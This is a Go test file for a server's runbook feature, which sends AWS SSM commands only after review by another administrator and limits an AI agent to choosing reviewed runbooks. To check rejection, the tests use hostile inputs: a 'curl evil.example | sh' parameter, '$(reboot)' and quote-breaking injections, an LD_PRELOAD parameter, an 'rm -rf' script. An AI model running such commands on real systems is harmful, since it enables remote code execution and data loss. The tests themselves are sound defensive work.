package server

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/forgelinehq/forgeline/internal/authn"
)

// ssmStub answers the AWS CLI calls a runbook makes: the tagged instances, send-command, and how each instance did.
type ssmStub struct {
	mu      sync.Mutex
	calls   []string // every call, as "service operation options"
	sent    []string // the --parameters JSON of each send-command
	targets [][]string
	status  string // what list-command-invocations reports; "" = Success
}

func (st *ssmStub) run(_ context.Context, name string, args ...string) ([]byte, string, error) {
	st.mu.Lock()
	defer st.mu.Unlock()
	key := strings.Join(args, " ")
	st.calls = append(st.calls, key)
	switch {
	case strings.Contains(key, "sts get-caller-identity"):
		return []byte(`{"Account":"111122223333","Arn":"arn:aws:sts::111122223333:assumed-role/Admin/ada","UserId":"AROA:ada"}`), "", nil
	case strings.Contains(key, "ec2 describe-instances"):
		return []byte(`["i-0bbbbbbbbbbbbbbbb","i-0aaaaaaaaaaaaaaaa"]`), "", nil
	case strings.Contains(key, "ssm send-command"):
		for i, a := range args {
			if a == "--parameters" {
				st.sent = append(st.sent, args[i+1])
			}
			if a == "--instance-ids" {
				st.targets = append(st.targets, append([]string(nil), args[i+1:]...))
			}
		}
		return []byte(`{"Command":{"CommandId":"cmd-1"}}`), "", nil
	case strings.Contains(key, "ssm list-command-invocations"):
		status := st.status
		if status == "" {
			status = "Success"
		}
		ids := st.targets[len(st.targets)-1]
		var inv []string
		for _, id := range ids {
			inv = append(inv, fmt.Sprintf(`{"InstanceId":%q,"Status":%q,"CommandPlugins":[{"ResponseCode":0,"Output":"Filesystem 91%% used\naws_secret_access_key=abcdEFGHijklMNOPqrstUVWXyz0123456789abcd\n"}]}`, id, status))
		}
		return []byte(`{"CommandInvocations":[` + strings.Join(inv, ",") + `]}`), "", nil
	}
	return []byte(`{}`), "", nil
}

// count is how many calls contained the text.
func (st *ssmStub) count(text string) int {
	st.mu.Lock()
	defer st.mu.Unlock()
	n := 0
	for _, c := range st.calls {
		if strings.Contains(c, text) {
			n++
		}
	}
	return n
}

func (st *ssmStub) sends() int {
	st.mu.Lock()
	defer st.mu.Unlock()
	return len(st.sent)
}

func runbookHarness(t *testing.T) (*mcpHarness, *ssmStub) {
	t.Helper()
	m := newMCPHarness(t)
	st := &ssmStub{}
	m.srv.run = st.run
	m.srv.runbookPoll = time.Millisecond
	m.admin.expect(200, "PUT", "/v1/integrations/aws", map[string]any{"enabled": true, "profile": "dev", "region": "ap-south-1"})
	return m, st
}

func newRunbook(t *testing.T, b *browser, kind string) Runbook {
	t.Helper()
	var rb Runbook
	json.Unmarshal(b.expect(201, "POST", "/v1/runbooks", map[string]any{
		"name": "Disk " + kind, "description": "A " + kind + " for the build server.", "kind": kind,
		"script": `df -hP "$DIR"; echo "keep $KEEP"`,
		"params": []map[string]any{
			{"name": "DIR", "type": "choice", "choices": []string{"/var/lib/jenkins", "/var"}, "default": "/var"},
			{"name": "KEEP", "type": "int", "min": 1, "max": 10, "default": "5"},
		},
		"target": map[string]any{"tag_key": "forgeline-runbooks", "tag_value": "jenkins"},
	}), &rb)
	return rb
}

func waitRun(t *testing.T, b *browser, id string) RunbookRun {
	t.Helper()
	var run RunbookRun
	for i := 0; i < 200; i++ {
		json.Unmarshal(b.expect(200, "GET", "/v1/runbook-runs/"+id, nil), &run)
		if run.Status != "running" && run.Status != apProposed {
			return run
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("run %s is still %s", id, run.Status)
	return run
}

// A runbook runs only once a different administrator has reviewed that exact version, and only that version runs.
func TestRunbookNeedsAReviewByAnotherAdministrator(t *testing.T) {
	m, st := runbookHarness(t)
	rb := newRunbook(t, m.admin, rbCheck)
	m.dev.expect(409, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{})
	m.dev.expect(403, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash}) // developers do not review
	m.admin.expect(403, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash})
	m.admin2.expect(409, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": "not-it"})
	m.admin2.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash})

	// A new version is not what runs until it too is reviewed.
	var rb2 Runbook
	json.Unmarshal(m.admin2.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/versions", map[string]any{"script": "rm -rf /var/lib/jenkins/workspace", "target": map[string]any{"instances": []string{"i-0aaaaaaaaaaaaaaaa"}}}), &rb2)
	if rb2.Current != 1 {
		t.Fatalf("an unreviewed version became current: %d", rb2.Current)
	}
	var run RunbookRun
	json.Unmarshal(m.dev.expect(202, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{}), &run)
	waitRun(t, m.dev, run.ID)
	if st.sends() != 1 || strings.Contains(st.sent[0], "rm -rf") {
		t.Errorf("the unreviewed version ran: %v", st.sent)
	}
	if !strings.Contains(string(m.admin.expect(200, "GET", "/v1/audit?limit=50", nil)), "refused: v1 was written by the reviewer") {
		t.Error("the refused self-review is not audited")
	}
}

// A check runs when a developer asks: parameters reach the script only as quoted, typed values; output is kept with
// credentials hidden.
func TestRunbookCheckRunsWithTypedParameters(t *testing.T) {
	m, st := runbookHarness(t)
	rb := newRunbook(t, m.admin, rbCheck)
	m.admin2.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash})

	for _, bad := range []map[string]string{
		{"DIR": "/var; curl evil.example | sh"}, // not one of the choices
		{"DIR": "'$(reboot)'"},
		{"KEEP": "11"},
		{"KEEP": "5; reboot"},
		{"CMD": "reboot"}, // no such parameter
	} {
		m.dev.expect(400, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{"params": bad})
	}
	if st.sends() != 0 {
		t.Fatal("a refused run reached SSM")
	}
	m.v.expect(403, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{})

	var run RunbookRun
	json.Unmarshal(m.dev.expect(202, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{"params": map[string]string{"DIR": "/var/lib/jenkins"}}), &run)
	run = waitRun(t, m.dev, run.ID)
	if run.Status != "succeeded" || len(run.Instances) != 2 || run.Instances[0].ID != "i-0aaaaaaaaaaaaaaaa" {
		t.Fatalf("run: %+v", run)
	}
	if strings.Contains(run.Instances[0].Output, "abcdEFGH") || !strings.Contains(run.Instances[0].Output, "91% used") {
		t.Errorf("output: %q", run.Instances[0].Output)
	}
	var p struct{ Commands []string }
	json.Unmarshal([]byte(st.sent[0]), &p)
	if len(p.Commands) != 1 || !strings.Contains(p.Commands[0], "DIR='/var/lib/jenkins'\nexport DIR\nKEEP='5'\n") || !strings.HasSuffix(p.Commands[0], `df -hP "$DIR"; echo "keep $KEEP"`+"\n") {
		t.Errorf("script sent: %q", p.Commands)
	}
	if run.TraceID == "" {
		t.Error("the run has no trace")
	}
}

// A fix is a proposal: nothing reaches the servers until a different administrator approves exactly what was asked.
func TestRunbookFixWaitsForADifferentAdministrator(t *testing.T) {
	m, st := runbookHarness(t)
	rb := newRunbook(t, m.admin2, rbFix)
	m.admin.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash})

	m.admin.expect(400, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{"reason": "short"})
	var run RunbookRun
	json.Unmarshal(m.admin.expect(202, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{"reason": "Jenkins disk is at 91 percent again"}), &run)
	if run.Status != apProposed || st.sends() != 0 {
		t.Fatalf("a fix ran without approval: %s, %d sends", run.Status, st.sends())
	}
	m.admin.expect(403, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash}) // who asked
	m.dev.expect(403, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash})   // not an administrator
	m.admin2.expect(409, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": "other"}) // not what was shown
	if st.sends() != 0 {
		t.Fatal("a refused approval reached SSM")
	}
	m.admin2.expect(202, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash})
	if got := waitRun(t, m.admin, run.ID); got.Status != "succeeded" || got.DecidedBy != "grace" || st.sends() != 1 {
		t.Errorf("approved fix: %s by %q, %d sends", got.Status, got.DecidedBy, st.sends())
	}
	m.admin2.expect(409, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash}) // only once

	// A runbook changed after the proposal is not run from the old proposal.
	json.Unmarshal(m.dev.expect(202, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{"reason": "Jenkins disk is full again"}), &run)
	var rb2 Runbook
	json.Unmarshal(m.admin2.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/versions", map[string]any{"script": "echo v2", "target": map[string]any{"instances": []string{"i-0aaaaaaaaaaaaaaaa"}}}), &rb2)
	m.admin.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 2, "hash": rb2.Versions[1].Hash})
	m.admin.expect(409, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash})
	if st.sends() != 1 {
		t.Error("a proposal for an old version ran")
	}
}

// An agent chooses a runbook and its values; it cannot send a command. A check gives it the output; a fix is filed.
func TestAgentsRunRunbooksButNeverCommands(t *testing.T) {
	m, st := runbookHarness(t)
	check, fix := newRunbook(t, m.admin, rbCheck), newRunbook(t, m.admin, rbFix)
	m.admin2.expect(200, "POST", "/v1/runbooks/"+check.ID+"/review", map[string]any{"version": 1, "hash": check.Versions[0].Hash})
	m.admin2.expect(200, "POST", "/v1/runbooks/"+fix.ID+"/review", map[string]any{"version": 1, "hash": fix.Versions[0].Hash})

	m.ask(m.dev, lookupReply(runRunbookTool, map[string]any{}))
	if res := m.llm.lastUser(1); !strings.Contains(res, `"`+check.ID+`" (check)`) || !strings.Contains(res, "DIR: one of /var/lib/jenkins|/var") {
		t.Errorf("menu: %s", res)
	}
	m.ask(m.dev, lookupReply(runRunbookTool, map[string]any{"runbook": check.ID, "params": map[string]string{"DIR": "/var"}}))
	if res := m.llm.lastUser(1); !strings.Contains(res, "succeeded on 2 instance(s)") || !strings.Contains(res, "91% used") {
		t.Errorf("check result: %s", res)
	}
	m.ask(m.dev, lookupReply(runRunbookTool, map[string]any{"runbook": check.ID, "params": map[string]string{"DIR": "/; reboot"}}))
	m.ask(m.dev, lookupReply(runRunbookTool, map[string]any{"runbook": check.ID, "script": "reboot"}))
	if res := m.llm.lastUser(1); !strings.Contains(res, "cannot send commands") {
		t.Errorf("an extra script field was not refused: %s", res)
	}
	m.ask(m.dev, lookupReply(runRunbookTool, map[string]any{"runbook": fix.ID, "params": map[string]string{"KEEP": "3"}, "reason": "the disk report shows 91 percent"}))
	if res := m.llm.lastUser(1); !strings.Contains(res, "Nothing has run") {
		t.Errorf("fix result: %s", res)
	}
	if st.sends() != 1 {
		t.Errorf("want only the one check sent, got %d: %v", st.sends(), st.sent)
	}
	// Viewers are not offered it.
	if help := m.srv.lookupHelp(context.Background(), authn.Viewer); strings.Contains(help, runRunbookTool) {
		t.Error("viewers are offered run_runbook")
	}
	// Turning off the AI's access to virtual machines stops agents, not people.
	m.admin.expect(200, "PUT", "/v1/integrations/aws/services", map[string]any{"off": []string{"ec2"}})
	m.ask(m.dev, lookupReply(runRunbookTool, map[string]any{"runbook": check.ID}))
	if res := m.llm.lastUser(1); !strings.Contains(res, "turned off") || st.sends() != 1 {
		t.Errorf("switched off: %s", res)
	}
}

// The example runbooks are valid bash and valid runbooks.
func TestRunbookExamplesAreValid(t *testing.T) {
	m, _ := runbookHarness(t)
	bash, err := exec.LookPath("bash")
	for _, ex := range runbookExamples {
		v := RunbookVersion{Script: ex.Script, Params: ex.Params, Timeout: ex.Timeout, Target: RunbookTarget{Instances: []string{"i-0aaaaaaaaaaaaaaaa"}}}
		if msg := m.srv.checkRunbookVersion(context.Background(), &v); msg != "" {
			t.Errorf("%s: %s", ex.Name, msg)
		}
		script, _, msg := renderRunbook(v, nil)
		if msg != "" {
			t.Errorf("%s defaults: %s", ex.Name, msg)
		}
		if err == nil {
			f := filepath.Join(t.TempDir(), "s.sh")
			os.WriteFile(f, []byte(script), 0o600)
			if out, err := exec.Command(bash, "-n", f).CombinedOutput(); err != nil {
				t.Errorf("%s does not parse: %s", ex.Name, out)
			}
		}
	}
}

// Credentials in output are hidden, including names joined by underscores; counts that only look similar are kept.
func TestHideSecretsCatchesJoinedNames(t *testing.T) {
	for _, in := range []string{"aws_secret_access_key=abcdEFGHijkl1234", "DB_PASSWORD: hunter2hunter2", "export GITHUB_TOKEN='abcdefgh12345'", "password = longenough1"} {
		if out, _ := hideSecrets(in); !strings.Contains(out, "[hidden]") {
			t.Errorf("not hidden: %q -> %q", in, out)
		}
	}
	for _, in := range []string{"max_tokens: 123456789", "tokens=123456789 used", "Filesystem 91% used"} {
		if out, changed := hideSecrets(in); changed {
			t.Errorf("hidden by mistake: %q -> %q", in, out)
		}
	}
}

// A runbook's parameters are checked when it is written: names are plain environment variables the shell does not
// use, and choices cannot leave the single quotes they are pasted into.
func TestRunbookParametersAreCheckedWhenWritten(t *testing.T) {
	m, _ := runbookHarness(t)
	base := func(params []map[string]any) map[string]any {
		return map[string]any{"name": "Bad", "description": "d", "kind": rbCheck, "script": "true", "params": params,
			"target": map[string]any{"instances": []string{"i-0aaaaaaaaaaaaaaaa"}}}
	}
	for _, p := range [][]map[string]any{
		{{"name": "PATH", "type": "choice", "choices": []string{"/tmp"}}},
		{{"name": "LD_PRELOAD", "type": "choice", "choices": []string{"/tmp/x.so"}}},
		{{"name": "dir; reboot", "type": "choice", "choices": []string{"/tmp"}}},
		{{"name": "DIR", "type": "choice", "choices": []string{"/tmp"}}, {"name": "DIR", "type": "int", "max": 3}},
		{{"name": "DIR", "type": "choice", "choices": []string{"/tmp'; reboot; echo '"}}},
		{{"name": "DIR", "type": "choice", "choices": []string{"$(reboot)"}}},
		{{"name": "DIR", "type": "text"}},
		{{"name": "N", "type": "int", "min": 5, "max": 1}},
	} {
		m.admin.expect(400, "POST", "/v1/runbooks", base(p))
	}
	m.admin.expect(400, "POST", "/v1/runbooks", map[string]any{"name": "Bad", "description": "d", "kind": rbCheck, "script": "true", "target": map[string]any{"instances": []string{"i-0aaaaaaaaaaaaaaaa; reboot"}}})
	m.admin.expect(400, "POST", "/v1/runbooks", map[string]any{"name": "Bad", "description": "d", "kind": "shell", "script": "true", "target": map[string]any{"instances": []string{"i-0aaaaaaaaaaaaaaaa"}}})
}

// When SSM cannot say how a command went, the run fails with the reason soon, instead of waiting out its time limit.
func TestRunbookRunFailsWhenSSMCannotBeRead(t *testing.T) {
	m, st := runbookHarness(t)
	rb := newRunbook(t, m.admin, rbCheck)
	m.admin2.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash})
	inner := st.run
	m.srv.run = func(ctx context.Context, name string, args ...string) ([]byte, string, error) {
		if strings.Contains(strings.Join(args, " "), "list-command-invocations") {
			return nil, "An error occurred (AccessDeniedException)", fmt.Errorf("exit 254")
		}
		return inner(ctx, name, args...)
	}
	var run RunbookRun
	json.Unmarshal(m.dev.expect(202, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{}), &run)
	if got := waitRun(t, m.dev, run.ID); got.Status != "failed" || !strings.Contains(got.Error, "could not read how the command went") {
		t.Errorf("run: %s %q", got.Status, got.Error)
	}
}

func TestRunbookRunLostInARestartIsSaidToHaveFailed(t *testing.T) {
	r := settleRun(RunbookRun{Status: "running", At: time.Now().Add(-2 * time.Hour), CommandID: "cmd-9"})
	if r.Status != "failed" || !strings.Contains(r.Error, "cmd-9") {
		t.Errorf("%+v", r)
	}
	if r := settleRun(RunbookRun{Status: "running", At: time.Now().Add(-time.Minute)}); r.Status != "running" {
		t.Errorf("a recent run: %s", r.Status)
	}
}

// An approval rule of kind runbook applies to fixes: two approvals means the first does not run it.
func TestApprovalRulesCoverRunbookFixes(t *testing.T) {
	m, st := runbookHarness(t)
	m.admin.createUser("hopper", authn.Admin)
	hopper := m.login("hopper")
	m.admin.expect(200, "PUT", "/v1/settings/approvals", map[string]any{"rules": []map[string]any{{"name": "Two for servers", "kinds": []string{"runbook"}, "approvals": 2}}})
	rb := newRunbook(t, m.admin, rbFix)
	m.admin2.expect(200, "POST", "/v1/runbooks/"+rb.ID+"/review", map[string]any{"version": 1, "hash": rb.Versions[0].Hash})
	var run RunbookRun
	json.Unmarshal(m.dev.expect(202, "POST", "/v1/runbooks/"+rb.ID+"/run", map[string]any{"reason": "the disk is full again"}), &run)
	if run.Approval == nil || run.Approval.Needed != 2 {
		t.Fatalf("approval state: %+v", run.Approval)
	}
	m.admin.expect(200, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash})
	if st.sends() != 0 {
		t.Fatal("one approval of two ran the fix")
	}
	hopper.expect(202, "POST", "/v1/runbook-runs/"+run.ID+"/approve", map[string]any{"hash": run.Hash})
	if got := waitRun(t, m.admin, run.ID); got.Status != "succeeded" || st.sends() != 1 {
		t.Errorf("after two approvals: %s, %d sends", got.Status, st.sends())
	}
}
